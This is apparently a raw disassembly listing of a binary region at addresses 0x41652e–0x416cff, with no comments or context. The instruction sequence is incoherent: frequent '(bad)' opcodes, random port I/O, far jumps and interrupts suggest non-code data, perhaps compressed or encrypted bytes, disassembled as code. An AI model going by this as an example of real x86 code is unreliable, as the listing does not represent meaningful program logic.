  41652e:	lods   eax,DWORD PTR ds:[esi]
  41652f:	adc    bl,BYTE PTR [edi+0x44]
  416532:	dec    esi
  416533:	adc    al,0xbb
  416535:	push   esi
  416536:	call   DWORD PTR [ebx+ecx*4-0x3d]
  41653a:	mov    dl,0xf0
  41653c:	imul   edx,DWORD PTR ds:0x2c3cd7b1,0x39bb259a
  416546:	cmp    DWORD PTR [ebx+0x56],edx
  416549:	mov    al,0x5a
  41654b:	in     eax,dx
  41654c:	adc    eax,0x6dce39ce
  416551:	mov    ds:0x8946c640,al
  416556:	jle    0x41655d
  416558:	test   esi,esi
  41655a:	stos   DWORD PTR es:[edi],eax
  41655b:	enter  0x56cb,0x5d
  41655f:	push   0xf71b5fa0
  416564:	add    BYTE PTR [esp+ebp*1],ah
  416567:	inc    eax
  416568:	call   0x3a5e2b30
  41656d:	or     eax,0x1fa5d860
  416572:	cmp    BYTE PTR [ebx-0x84f4898],al
  416578:	out    0x46,al
  41657a:	mov    bl,0x33
  41657c:	pop    ebx
  41657d:	xor    eax,0xad93d346
  416582:	iret   
  416583:	out    0x80,eax
  416585:	sub    eax,DWORD PTR [edx+ebx*2]
  416588:	pop    ebp
  416589:	push   ds
  41658a:	xchg   edx,eax
  41658b:	adc    DWORD PTR [esi-0x21797e4f],esi
  416591:	xchg   edi,eax
  416592:	div    DWORD PTR [ebp+0x54]
  416595:	clc    
  416596:	std    
  416597:	push   esp
  416598:	xchg   sp,ax
  41659a:	mov    ds:0x4afc565e,eax
  41659f:	jge    0x416534
  4165a1:	mov    edi,0x30cf9117
  4165a6:	int    0xb5
  4165a8:	popf   
  4165a9:	xchg   eax,esi
  4165ab:	adc    BYTE PTR [edi],bl
  4165ad:	retf   
  4165ae:	mov    ah,0x7b
  4165b0:	cli    
  4165b1:	pop    esp
  4165b2:	lods   eax,DWORD PTR ds:[esi]
  4165b3:	fild   QWORD PTR [ecx]
  4165b5:	and    eax,0xa6bf1d36
  4165ba:	push   ds
  4165bb:	mov    cl,0x9f
  4165bd:	sub    al,0xec
  4165bf:	adc    BYTE PTR [ecx+ebp*2],ch
  4165c2:	sub    ebp,edx
  4165c4:	mov    ss,WORD PTR [edx-0x25]
  4165c7:	imul   esi,edi,0xffffff96
  4165ca:	mov    cs,WORD PTR [ebx]
  4165cc:	mov    dl,0x6e
  4165ce:	retf   0xc9fe
  4165d1:	pop    ebp
  4165d2:	push   esi
  4165d3:	and    DWORD PTR [ebx-0x43],0xe9326441
  4165da:	xchg   ebx,eax
  4165db:	retf   0xd2b1
  4165de:	adc    ch,al
  4165e0:	xchg   ebp,eax
  4165e1:	mov    ebp,0x61cec0db
  4165e6:	aam    0x1a
  4165e8:	repz xor BYTE PTR [ecx-0x33af964d],ah
  4165ef:	push   0x6470ff07
  4165f4:	bound  edx,QWORD PTR [edx-0x60d7dba6]
  4165fa:	aad    0xa8
  4165fc:	js     0x41658e
  4165fe:	sahf   
  4165ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416600:	pextrw ebx,(bad),0xc5
  416602:	pop    edx
  416603:	or     eax,0x97646ad
  416608:	out    dx,al
  416609:	ficomp DWORD PTR cs:[esi-0x6960553a]
  416610:	or     al,0xba
  416612:	and    DWORD PTR [edx],ebx
  416614:	adc    ebp,edi
  416616:	mov    ds:0x331286d5,al
  41661b:	(bad)  
  41661c:	fimul  WORD PTR ss:[ecx-0xb]
  416620:	pushf  
  416621:	or     BYTE PTR [ebx+edx*4],0x93
  416625:	pop    eax
  416626:	mov    cl,0x45
  416628:	sub    al,0xac
  41662a:	dec    eax
  41662b:	or     ebx,DWORD PTR [ebp-0x56b62ec3]
  416631:	inc    edi
  416632:	xor    al,0x4a
  416634:	(bad)  
  416635:	lock dec eax
  416637:	(bad)  
  416638:	adc    esp,DWORD PTR [eax]
  41663a:	in     al,dx
  41663b:	jo     0x416665
  41663d:	jmp    0xcca28943
  416642:	xor    al,0x16
  416644:	mov    ds:0x9bc6f227,eax
  416649:	(bad)
  41664d:	sti    
  41664e:	xchg   edi,eax
  41664f:	hlt    
  416650:	and    BYTE PTR [edi-0x53069682],dh
  416656:	nop
  416657:	ja     0x41664f
  416659:	xchg   ebx,eax
  41665a:	das    
  41665b:	mov    esi,0x31865758
  416660:	mov    ecx,0x1b147391
  416665:	pop    edx
  416666:	mov    BYTE PTR [ebp-0x75],cl
  416669:	mov    edi,DWORD PTR [esi+esi*8+0x7a26a424]
  416670:	dec    esi
  416671:	xchg   edx,eax
  416672:	push   edi
  416673:	sub    cl,BYTE PTR [edx]
  416675:	icebp  
  416676:	mov    gs,WORD PTR ss:[esi-0x799259e4]
  41667d:	push   DWORD PTR [eax+0x1bab96ce]
  416683:	stos   DWORD PTR es:[edi],eax
  416684:	xor    edi,0x403d5e9f
  41668a:	out    dx,eax
  41668b:	(bad)  
  41668c:	call   0x98a77727
  416691:	jo     0x4166b0
  416693:	mov    bh,0xea
  416695:	mov    al,0x15
  416697:	inc    ebp
  416698:	jb     0x416626
  41669a:	push   ebx
  41669b:	or     bl,BYTE PTR [eax]
  41669d:	jge    0x4166fa
  41669f:	pop    eax
  4166a0:	cmp    ah,BYTE PTR [edi-0x39]
  4166a3:	xchg   ebp,eax
  4166a4:	fidivr DWORD PTR ds:0xcf7fa73a
  4166aa:	push   ss
  4166ab:	in     eax,0x27
  4166ad:	int    0xc9
  4166af:	inc    ebx
  4166b0:	and    cl,BYTE PTR [ebx+0x42]
  4166b3:	dec    edi
  4166b4:	repz and DWORD PTR [ebx-0x5fe0426b],esi
  4166bb:	mov    ecx,0x826a1538
  4166c0:	and    al,0xf7
  4166c2:	pop    eax
  4166c3:	dec    eax
  4166c4:	sbb    BYTE PTR [ecx],dh
  4166c6:	mov    al,ds:0xc5387f54
  4166cb:	test   eax,0xacdb149c
  4166d0:	ret    0xc82e
  4166d3:	test   BYTE PTR [edi],ah
  4166d5:	mov    ebp,0x6b3a40ac
  4166da:	or     al,BYTE PTR [ecx]
  4166dc:	cmp    ecx,ebp
  4166de:	(bad)  
  4166df:	cmp    DWORD PTR [edx-0x41c6f51b],esi
  4166e5:	xchg   esi,eax
  4166e6:	cmp    ebx,edi
  4166e8:	add    eax,0x16212eea
  4166ed:	xchg   ecx,eax
  4166ee:	inc    esi
  4166ef:	add    BYTE PTR [esi+esi*8-0x4aa9c6d2],dh
  4166f6:	fcomp  QWORD PTR [eax-0x25]
  4166f9:	sbb    DWORD PTR cs:[edi],ebp
  4166fc:	or     DWORD PTR [edi+0x2a],esi
  4166ff:	ins    BYTE PTR es:[edi],dx
  416700:	xor    eax,0x91e0b782
  416705:	cmp    al,0x24
  416707:	mov    eax,ds:0x6a95d0dc
  41670c:	jp     0x4166dc
  41670e:	rcl    ah,1
  416710:	jbe    0x4166c0
  416712:	push   edx
  416713:	fmul   DWORD PTR [ecx-0x10]
  416716:	jns    0x416711
  416718:	sbb    al,0xed
  41671a:	mov    ds:0xaa5435ee,eax
  41671f:	icebp  
  416720:	inc    ecx
  416721:	xlat   BYTE PTR ds:[ebx]
  416722:	push   es
  416723:	adc    al,0xa5
  416725:	mov    eax,ds:0x7a8f7ec7
  41672a:	sbb    BYTE PTR [esi+0x62],dh
  41672d:	std    
  41672e:	push   edi
  41672f:	stos   DWORD PTR es:[edi],eax
  416730:	xchg   edi,eax
  416731:	nop
  416732:	js     0x41675a
  416734:	fcomp  DWORD PTR [esi]
  416736:	test   DWORD PTR [esi+0x77ed489a],ebp
  41673c:	mov    esp,0x3a15dc0e
  416741:	cmc    
  416742:	xchg   edi,eax
  416743:	fisttp DWORD PTR [eax+0x4a]
  416746:	inc    eax
  416747:	leave  
  416748:	jp     0x416756
  41674a:	pushf  
  41674b:	pop    edx
  41674c:	mov    ebx,0x172136ec
  416751:	jbe    0x41678d
  416753:	xor    dl,BYTE PTR [edi+0x9]
  416756:	jbe    0x41674c
  416758:	sbb    DWORD PTR [ebx-0x2fbd62ec],edi
  41675e:	jnp    0x41673b
  416760:	inc    ecx
  416761:	add    ah,dh
  416763:	push   esp
  416764:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  416766:	arpl   di,bx
  416768:	xchg   esi,eax
  41676a:	idiv   DWORD PTR [edx+eiz*4-0x72dbbd2b]
  416771:	or     bl,ah
  416773:	push   0xeab2105e
  416778:	retf   0x6c35
  41677b:	pop    ds
  41677c:	mov    ch,0x37
  41677e:	push   0x7c2e5bf0
  416783:	pop    edx
  416784:	daa    
  416785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416786:	xor    al,0x46
  416788:	mov    ecx,0x1d72d642
  41678d:	cs xchg edx,eax
  41678f:	stos   BYTE PTR es:[edi],al
  416790:	cmp    BYTE PTR [ecx+esi*2],bh
  416793:	(bad)  [esi]
  416795:	or     DWORD PTR [eax],ecx
  416797:	nop
  416798:	adc    eax,0xf70bbc64
  41679d:	mov    ebx,0x617915f5
  4167a2:	push   ecx
  4167a3:	out    0x54,al
  4167a5:	dec    edx
  4167a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167a7:	icebp  
  4167a8:	mov    edi,0x6d694fea
  4167ad:	(bad)  
  4167ae:	mov    cl,0xc2
  4167b0:	test   al,0xaf
  4167b2:	and    cl,BYTE PTR [edi+0x6dde1a60]
  4167b8:	out    dx,al
  4167b9:	loope  0x4167cf
  4167bb:	retf   0xebf4
  4167be:	int    0xbf
  4167c0:	mov    ch,BYTE PTR [edx-0x66]
  4167c3:	xchg   ebx,eax
  4167c4:	les    eax,FWORD PTR [ebp-0x5e]
  4167c7:	lds    edi,FWORD PTR [esi-0x4c]
  4167ca:	adc    BYTE PTR ds:[edi+esi*8+0x7dbfdfff],0xa9
  4167d3:	(bad)  
  4167d4:	ficomp DWORD PTR [ebx+ecx*2+0x6ffd6c81]
  4167db:	es enter 0x9a91,0xd8
  4167e0:	ins    DWORD PTR es:[edi],dx
  4167e1:	test   ebp,0x2abdbbf6
  4167e7:	jg     0x4167cd
  4167e9:	icebp  
  4167ea:	jno    0x416785
  4167ec:	and    eax,0x52e234d3
  4167f1:	daa    
  4167f2:	mov    ds:0x5183a3c3,al
  4167f7:	push   ds
  4167f8:	ret    
  4167f9:	mov    BYTE PTR [esi-0x5e5ce6d8],ch
  4167ff:	sar    ebx,1
  416801:	adc    BYTE PTR [ecx-0x2c],cl
  416804:	stos   BYTE PTR es:[edi],al
  416805:	adc    BYTE PTR [edi-0xd3df059],dl
  41680b:	ins    DWORD PTR es:[edi],dx
  41680c:	mov    dh,0x2b
  41680e:	aam    0x2f
  416810:	rol    DWORD PTR [ecx],cl
  416812:	shr    ah,1
  416814:	inc    edx
  416815:	fidiv  DWORD PTR [edi]
  416817:	cmp    al,0x1d
  416819:	es dec ecx
  41681b:	mov    eax,0xbf29143e
  416820:	inc    ecx
  416821:	jb     0x416880
  416823:	xor    DWORD PTR [ebx-0x57],0x20550854
  41682a:	(bad)  
  41682b:	adc    bl,BYTE PTR [eax-0x29007d68]
  416831:	xchg   BYTE PTR [edx+0x4f],ah
  416834:	mov    cl,0x15
  416836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416837:	sahf   
  416838:	clc    
  416839:	mov    cl,0x95
  41683b:	mov    esp,0x127c4db5
  416840:	push   ecx
  416841:	inc    ebx
  416842:	sbb    dh,bh
  416844:	cdq    
  416845:	shl    DWORD PTR [esi-0x9da5ccc],cl
  41684b:	mov    eax,0xf8244300
  416850:	adc    DWORD PTR [esi],esp
  416852:	or     BYTE PTR [eax-0x281ab155],0x6c
  416859:	cmp    al,0x50
  41685b:	and    BYTE PTR [esi+ebx*2-0x1e],ah
  41685f:	fucom  st(4)
  416861:	xchg   ecx,eax
  416862:	or     dl,dl
  416864:	adc    DWORD PTR [ecx+0xcd77204],eax
  41686a:	dec    edi
  41686b:	lea    eax,[ecx]
  41686d:	sbb    al,BYTE PTR [edx+0x112a41e9]
  416873:	fbld   TBYTE PTR [ebp-0x8a26ec5]
  416879:	dec    esi
  41687a:	mov    ah,0xc8
  41687c:	or     ebp,DWORD PTR ds:0x55ecead6
  416882:	fmul   DWORD PTR [eax+0x7]
  416885:	stos   BYTE PTR es:[edi],al
  416886:	xchg   ebx,eax
  416887:	pushf  
  416888:	dec    ecx
  416889:	(bad)  
  41688a:	into   
  41688b:	aas    
  41688c:	scas   eax,DWORD PTR es:[edi]
  41688d:	xchg   ebx,eax
  41688e:	jae    0x416817
  416890:	add    ecx,DWORD PTR [ecx-0x7a]
  416893:	pop    ecx
  416894:	cmp    al,0x39
  416896:	dec    ebp
  416897:	jmp    esi
  416899:	mov    DWORD PTR [ebx+0x8],ecx
  41689c:	jno    0x416901
  41689e:	cli    
  41689f:	push   0xffffff82
  4168a1:	in     eax,0xcb
  4168a3:	mov    ecx,0x9ebe96b7
  4168a8:	mov    cl,0xde
  4168aa:	jns    0x4168e4
  4168ac:	push   ecx
  4168ad:	push   0xffffffa7
  4168af:	inc    esp
  4168b0:	xor    ch,BYTE PTR [edx]
  4168b2:	mov    ah,0x50
  4168b4:	mov    ds:0xc47d1beb,al
  4168b9:	(bad)  
  4168ba:	scas   al,BYTE PTR es:[edi]
  4168bb:	cmp    BYTE PTR [esi+0x28be2c60],al
  4168c1:	adc    BYTE PTR [eax+eiz*2+0x62da3025],0x14
  4168c9:	test   BYTE PTR [ecx],dh
  4168cb:	pop    es
  4168cc:	(bad)  
  4168cd:	jnp    0x41692f
  4168cf:	push   ds
  4168d0:	adc    BYTE PTR [edi],bh
  4168d2:	out    0xba,al
  4168d4:	stos   DWORD PTR es:[edi],eax
  4168d5:	add    ecx,DWORD PTR [edx+0x5c]
  4168d8:	sbb    eax,0x5f9a00f3
  4168dd:	cmp    esp,eax
  4168df:	aaa    
  4168e0:	xor    BYTE PTR [edx],ah
  4168e2:	test   BYTE PTR [edx-0x5d760e05],dl
  4168e8:	jmp    0xbff2:0x5af99e6b
  4168ef:	aaa    
  4168f0:	repz mov ds:0x2833bb92,al
  4168f6:	jmp    0xf78a771e
  4168fb:	pop    esi
  4168fc:	iret   
  4168fd:	or     al,0xf0
  4168ff:	jno    0x4168c4
  416901:	stos   BYTE PTR es:[edi],al
  416902:	push   ds
  416903:	hlt    
  416904:	fld    DWORD PTR [ebx]
  416906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416907:	retf   
  416908:	mov    ds:0x9124ae8d,eax
  41690d:	leave  
  41690e:	loope  0x416969
  416910:	xchg   edx,eax
  416911:	or     bl,bh
  416913:	scas   al,BYTE PTR es:[edi]
  416914:	cli    
  416915:	xchg   esi,eax
  416916:	or     al,BYTE PTR [ebx+0x3]
  416919:	scas   eax,DWORD PTR es:[edi]
  41691a:	ss cmp al,0xa2
  41691d:	cld    
  41691e:	push   ecx
  41691f:	jge    0x41696d
  416921:	repz mov ebp,0x66d67b9c
  416927:	fist   DWORD PTR [esi-0x53]
  41692a:	cwde   
  41692b:	pop    es
  41692c:	jae    0x4168d8
  41692e:	jge    0x416929
  416930:	sub    al,0x54
  416932:	sar    DWORD PTR [ebx-0x2ff53a36],0xb8
  416939:	cdq    
  41693a:	or     esi,DWORD PTR [edi+0x4d]
  41693d:	mov    ch,0x13
  41693f:	(bad)  
  416940:	xchg   edx,eax
  416941:	out    dx,al
  416942:	fwait
  416943:	dec    eax
  416944:	push   ebx
  416945:	shl    DWORD PTR [edx+0x7d],1
  416948:	mov    ebp,0x11dc92db
  41694d:	(bad)  
  41694e:	fsubr  QWORD PTR [edx-0x80fbb26]
  416954:	jge    0x41690e
  416956:	dec    ecx
  416957:	jp     0x41691f
  416959:	addr16 repz das 
  41695c:	adc    BYTE PTR [edx+ebp*4+0x76e115cd],dh
  416963:	stc    
  416964:	dec    eax
  416965:	xor    bl,0xca
  416968:	pop    ebp
  416969:	dec    ebx
  41696a:	rcr    edi,0xd3
  41696d:	lds    edi,FWORD PTR [esi+0x63da900a]
  416973:	mov    bl,0x26
  416975:	push   0xffffff8b
  416977:	and    eax,0x22ff1d2f
  41697c:	dec    esp
  41697d:	popf   
  41697e:	js     0x416931
  416980:	(bad)  
  416981:	jns    0x4169e5
  416983:	into   
  416984:	loop   0x4169f2
  416986:	push   DWORD PTR [edi+eiz*4]
  416989:	dec    esp
  41698a:	dec    ebp
  41698b:	dec    esi
  41698c:	jecxz  0x4169c8
  41698e:	mov    bl,0x7d
  416990:	add    ebp,ecx
  416992:	fistp  QWORD PTR [edx+0x76d28aba]
  416998:	or     DWORD PTR [edx],esp
  41699a:	and    eax,0x2b5b0892
  41699f:	xchg   edi,eax
  4169a0:	mov    ds,WORD PTR [esi]
  4169a2:	add    BYTE PTR [ebx-0x410f2803],0xf
  4169a9:	hlt    
  4169aa:	in     eax,0x60
  4169ac:	xor    esi,DWORD PTR [eax-0x34]
  4169af:	enter  0xc0c2,0x68
  4169b3:	add    BYTE PTR [ecx-0x24731414],ch
  4169b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169ba:	in     eax,0x4d
  4169bc:	pop    edi
  4169bd:	sbb    dl,BYTE PTR ss:[eax+0x25]
  4169c1:	jecxz  0x4169b0
  4169c3:	cmp    bl,cl
  4169c5:	mov    dl,0x44
  4169c7:	push   edi
  4169c8:	jbe    0x41698d
  4169ca:	mov    BYTE PTR [edx],0x9
  4169cd:	sub    ah,cl
  4169cf:	call   FWORD PTR ds:0xfe498614
  4169d5:	pop    eax
  4169d6:	popa   
  4169d7:	adc    BYTE PTR [esi+esi*8-0x750f717],bh
  4169de:	or     ecx,eax
  4169e0:	add    DWORD PTR [eax],ecx
  4169e2:	inc    edx
  4169e3:	ins    BYTE PTR es:[edi],dx
  4169e4:	setbe  cl
  4169e7:	jno    0x4169bb
  4169e9:	fild   WORD PTR [ebx+0x51]
  4169ec:	pop    ebp
  4169ed:	push   0x9e573dd4
  4169f2:	xor    BYTE PTR [eax],ch
  4169f4:	iret   
  4169f5:	lds    ecx,FWORD PTR [eax-0x65]
  4169f8:	jge    0x41697e
  4169fa:	mov    eax,ds:0x45cc9851
  4169ff:	add    edx,esp
  416a01:	(bad)  
  416a02:	enter  0x2225,0x11
  416a06:	mov    DWORD PTR [ebx],esp
  416a08:	std    
  416a09:	test   al,0x7
  416a0b:	xchg   edx,eax
  416a0c:	xchg   esp,eax
  416a0d:	mov    DWORD PTR [eax+0x34],edi
  416a10:	mov    WORD PTR [esi+0x2c45f67e],es
  416a16:	adc    al,BYTE PTR [edi]
  416a18:	imul   esi,DWORD PTR [edx+0x5],0xdc7271b0
  416a1f:	pop    ebp
  416a20:	cmp    DWORD PTR ds:0x9e7a22a,esp
  416a26:	cmp    al,BYTE PTR [edi-0x3d09bcc2]
  416a2c:	out    0x60,al
  416a2e:	aas    
  416a2f:	stos   DWORD PTR es:[edi],eax
  416a30:	mov    WORD PTR [ecx-0x2ab716ef],es
  416a36:	jg     0x416a3a
  416a38:	mov    al,ds:0x4e5c7f56
  416a3d:	pushf  
  416a3e:	lods   al,BYTE PTR ds:[esi]
  416a3f:	dec    esp
  416a40:	xchg   esp,eax
  416a41:	outs   dx,DWORD PTR ds:[esi]
  416a42:	xchg   edi,eax
  416a43:	pop    ebp
  416a44:	add    bl,ah
  416a46:	icebp  
  416a47:	sbb    BYTE PTR [ecx+0xd96f97b],0xca
  416a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a4f:	cli    
  416a50:	cli    
  416a51:	icebp  
  416a52:	sbb    DWORD PTR [eax],ebx
  416a54:	iret   
  416a55:	xchg   esp,eax
  416a56:	dec    ecx
  416a57:	add    eax,0x57c2b441
  416a5c:	shr    DWORD PTR [ebp+eax*8+0x2e],cl
  416a60:	mov    ch,0x41
  416a62:	int3   
  416a63:	(bad)  
  416a64:	dec    esp
  416a65:	dec    esp
  416a66:	pop    ss
  416a67:	clc    
  416a68:	mov    ecx,0x6ff11b59
  416a6d:	push   0xcf1d92e8
  416a72:	inc    ebp
  416a73:	lods   al,BYTE PTR ds:[esi]
  416a74:	mov    esi,0xe2db526f
  416a79:	int3   
  416a7a:	pminsw mm7,mm3
  416a7d:	mov    cl,0x29
  416a7f:	fs or  ecx,ebx
  416a82:	(bad)  
  416a83:	shl    ah,1
  416a85:	je     0x416a18
  416a87:	pop    ecx
  416a88:	sub    esi,ebp
  416a8a:	ja     0x416afd
  416a8c:	jg     0x416a8a
  416a8e:	(bad)  
  416a8f:	stc    
  416a90:	inc    ecx
  416a91:	mov    ds:0xda1387ce,eax
  416a96:	mov    es,WORD PTR [edi-0x6cd73229]
  416a9c:	std    
  416a9d:	xor    al,0xd5
  416a9f:	dec    edi
  416aa0:	scas   eax,DWORD PTR es:[edi]
  416aa1:	adc    edx,DWORD PTR [edi-0x76]
  416aa4:	cmc    
  416aa5:	pop    ds
  416aa6:	hlt    
  416aa7:	push   esp
  416aa8:	lods   eax,DWORD PTR ds:[esi]
  416aa9:	jb     0x416a37
  416aab:	mov    al,0x30
  416aad:	sub    ch,al
  416aaf:	inc    eax
  416ab0:	add    BYTE PTR [eax],dh
  416ab2:	bound  ecx,QWORD PTR [edi]
  416ab4:	push   esp
  416ab5:	dec    edi
  416ab7:	ror    DWORD PTR [edi],cl
  416ab9:	cld    
  416aba:	or     cl,BYTE PTR [eax-0x50594e5d]
  416ac0:	ret    0xfd62
  416ac3:	ins    BYTE PTR es:[edi],dx
  416ac4:	and    al,0x97
  416ac6:	cmc    
  416ac7:	push   es
  416ac8:	fisub  DWORD PTR [edx+0x21]
  416acb:	repz sbb DWORD PTR [edx],0x64
  416acf:	mov    al,ds:0xf3c2f986
  416ad4:	retf   0xc582
  416ad7:	repnz aas 
  416ad9:	clc    
  416ada:	jne    0x416ada
  416adc:	push   ss
  416add:	sbb    BYTE PTR [ecx],0xe0
  416ae0:	adc    ebx,DWORD PTR [eax+0x5e0bc33a]
  416ae6:	xchg   ebp,eax
  416ae7:	retf   
  416ae8:	jecxz  0x416b29
  416aea:	test   BYTE PTR [ebp-0x1b],ah
  416aed:	retf   
  416aee:	stc    
  416aef:	add    edi,ebp
  416af1:	test   DWORD PTR [eax+eax*1-0x16720fb3],ebx
  416af8:	push   es
  416af9:	pop    ds
  416afa:	lea    esi,[ebp+0x15]
  416afd:	jmp    FWORD PTR ds:0xed917c4d
  416b03:	mov    esi,0x3d9b62b5
  416b08:	xor    DWORD PTR [ebx],edi
  416b0a:	add    DWORD PTR [eax-0x35],edi
  416b0d:	stos   DWORD PTR es:[edi],eax
  416b0e:	adc    edi,ecx
  416b10:	push   es
  416b11:	sbb    al,0x8d
  416b13:	int3   
  416b14:	inc    ebx
  416b15:	push   esp
  416b16:	repz or BYTE PTR [eax],cl
  416b19:	out    0x4e,al
  416b1b:	dec    edx
  416b1c:	or     eax,eax
  416b1e:	and    eax,0x12c72d0c
  416b23:	test   al,0x34
  416b25:	iret   
  416b26:	or     al,0x29
  416b28:	xchg   esi,eax
  416b29:	mov    dh,0xdb
  416b2b:	dec    esi
  416b2c:	das    
  416b2d:	push   0x8d9333f4
  416b32:	retf   
  416b33:	ret    
  416b34:	sub    al,0xc8
  416b36:	in     eax,0x2f
  416b38:	push   0x4fe2b86b
  416b3d:	aas    
  416b3e:	dec    ebp
  416b3f:	mov    esi,0x309c55b8
  416b44:	jns    0x416bbd
  416b46:	push   ecx
  416b47:	addr16 jl 0x416b1d
  416b4a:	add    eax,0x71fc5a44
  416b4f:	clc    
  416b50:	jg     0x416b63
  416b52:	cli    
  416b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b54:	iret   
  416b55:	fldcw  WORD PTR [edx+0x7]
  416b58:	dec    edx
  416b59:	inc    esp
  416b5a:	fdivr  DWORD PTR [ecx]
  416b5c:	xor    esi,eax
  416b5e:	mov    bh,0xb1
  416b60:	adc    al,0xbe
  416b62:	and    BYTE PTR [edx+edi*1+0x2],cl
  416b66:	pop    esp
  416b67:	jb     0x416b24
  416b69:	pop    edx
  416b6a:	adc    ecx,ebp
  416b6c:	and    BYTE PTR [edx+edi*8],cl
  416b6f:	aad    0xd8
  416b71:	stos   DWORD PTR es:[edi],eax
  416b72:	cmp    DWORD PTR [esi+0x49a03787],ecx
  416b78:	fisubr WORD PTR [edx-0x1bcd2223]
  416b7e:	cdq    
  416b7f:	add    ebp,ecx
  416b81:	jmp    0x7e81:0xb060be7b
  416b88:	in     eax,0x61
  416b8a:	inc    edi
  416b8b:	jmp    0xe5e6:0xa7f8317d
  416b92:	dec    esp
  416b93:	push   edi
  416b94:	push   ecx
  416b95:	sbb    bl,BYTE PTR [edi]
  416b97:	push   0xffffffa0
  416b99:	jmp    0x416c14
  416b9b:	push   0xea665210
  416ba0:	jmp    0x8db3410c
  416ba5:	and    dl,BYTE PTR [ebx+ecx*2-0x6456cb2c]
  416bac:	jp     0x416b35
  416bae:	fimul  DWORD PTR [eax-0x61a718c4]
  416bb4:	fild   QWORD PTR [eax-0x185f025f]
  416bba:	mov    fs,WORD PTR [edx]
  416bbc:	test   BYTE PTR ds:[edx+ebp*8-0x28],bl
  416bc1:	dec    edx
  416bc2:	dec    ebp
  416bc3:	int3   
  416bc4:	ins    BYTE PTR es:[edi],dx
  416bc5:	cmp    bh,BYTE PTR [ecx-0x25]
  416bc8:	ds popf 
  416bca:	mov    eax,ds:0x14fdf46b
  416bcf:	pop    ecx
  416bd0:	mov    eax,0xb6b80951
  416bd5:	adc    ah,cl
  416bd7:	pop    ss
  416bd8:	mov    eax,ds:0x82d0007e
  416bdd:	out    dx,eax
  416bde:	ret    0x667f
  416be1:	mov    BYTE PTR [ecx],dl
  416be3:	psrlw  mm1,QWORD PTR [ebx+0xcbe5a69]
  416bea:	arpl   WORD PTR [ecx],cx
  416bec:	pop    edi
  416bed:	and    DWORD PTR [ebx+0x174778eb],esi
  416bf3:	cmp    dh,BYTE PTR [eax]
  416bf5:	pop    edi
  416bf6:	jle    0x416b89
  416bf8:	into   
  416bf9:	mov    ecx,DWORD PTR [edi+0x65be9c54]
  416bff:	in     eax,dx
  416c00:	pop    es
  416c01:	push   0x7114fe73
  416c06:	popa   
  416c07:	adc    eax,0x2682268a
  416c0c:	jle    0x416c60
  416c0e:	sub    cl,BYTE PTR [ebp+edi*8-0x680651e8]
  416c15:	mov    esi,0x63f6242
  416c1a:	test   al,0x77
  416c1c:	int    0x5
  416c1e:	(bad)  
  416c1f:	mov    eax,ds:0x4fe5fd78
  416c24:	pop    esp
  416c25:	es mov eax,0xa64d95f6
  416c2b:	popa   
  416c2c:	jbe    0x416c38
  416c2e:	mov    ebp,0x1f02da24
  416c33:	sub    eax,0x2928e406
  416c38:	bound  edx,QWORD PTR [edx]
  416c3a:	sub    bh,BYTE PTR [esi-0x4a]
  416c3d:	out    0x32,al
  416c3f:	repz sbb edx,esp
  416c42:	inc    eax
  416c43:	icebp  
  416c44:	aaa    
  416c45:	repz dec eax
  416c47:	(bad)  
  416c48:	je     0x416c46
  416c4a:	inc    eax
  416c4b:	mov    ds:0xc4ddb51e,al
  416c50:	inc    eax
  416c51:	push   edi
  416c52:	out    dx,eax
  416c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c54:	inc    edx
  416c55:	in     al,0x44
  416c57:	add    eax,0xa90d9dd3
  416c5c:	in     al,dx
  416c5d:	mov    ds:0x48dec993,eax
  416c62:	(bad)  
  416c63:	xlat   BYTE PTR ds:[ebx]
  416c64:	stos   DWORD PTR es:[edi],eax
  416c65:	lahf   
  416c66:	jno    0x416c95
  416c68:	jmp    0x416cc6
  416c6a:	mov    edi,0x896f023f
  416c6f:	dec    ecx
  416c70:	xor    BYTE PTR [ebp-0x612542cf],ah
  416c76:	add    eax,0x9f9779a3
  416c7b:	inc    ecx
  416c7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c7d:	stc    
  416c7e:	jo     0x416ccb
  416c80:	lods   al,BYTE PTR ds:[esi]
  416c81:	je     0x416cd0
  416c83:	jne    0x416c83
  416c85:	adc    DWORD PTR [esi+0xf],0x35
  416c89:	hlt    
  416c8a:	ins    DWORD PTR es:[edi],dx
  416c8b:	push   0xab8cc7a9
  416c90:	add    ch,BYTE PTR [edi]
  416c92:	ins    DWORD PTR es:[edi],dx
  416c93:	jns    0x416c70
  416c95:	(bad)  
  416c97:	es test eax,0x21167fb8
  416c9d:	mov    al,ds:0xc23a5d6
  416ca2:	rcr    DWORD PTR [ecx-0x3e],0x81
  416ca6:	adc    DWORD PTR [edi-0x3595727d],esp
  416cac:	adc    al,0xe0
  416cae:	sub    eax,0x4b7a07c9
  416cb3:	mov    ch,0x56
  416cb5:	fisub  DWORD PTR [ecx]
  416cb7:	push   ecx
  416cb8:	jl     0x416c83
  416cba:	mov    fs,WORD PTR [eax]
  416cbc:	mov    bl,0xfd
  416cbe:	iret   
  416cbf:	inc    ebp
  416cc0:	test   DWORD PTR [eax+ecx*8-0xb5a178],esp
  416cc7:	(bad)  
  416cc8:	sub    ah,BYTE PTR [ecx-0x3f]
  416ccb:	pop    edi
  416ccc:	pop    esp
  416ccd:	mov    dl,0xaf
  416ccf:	ins    BYTE PTR es:[edi],dx
  416cd0:	push   ebp
  416cd1:	xchg   edi,eax
  416cd2:	cmp    al,0x44
  416cd4:	xchg   DWORD PTR [esi-0x15d271d0],ebp
  416cda:	imul   esp,DWORD PTR [ebx+0x62252a96],0x628f6823
  416ce4:	and    DWORD PTR [esi+0x4dd90c08],edx
  416cea:	sbb    ah,BYTE PTR [esi]
  416cec:	cs leave 
  416cee:	inc    eax
  416cef:	xchg   DWORD PTR [eax-0x4b061685],ebp
  416cf5:	fsubr  QWORD PTR [esi+ebp*4]
  416cf8:	jmp    0xcfab:0xcfdd0e65
  416cff:	out    0x80,eax
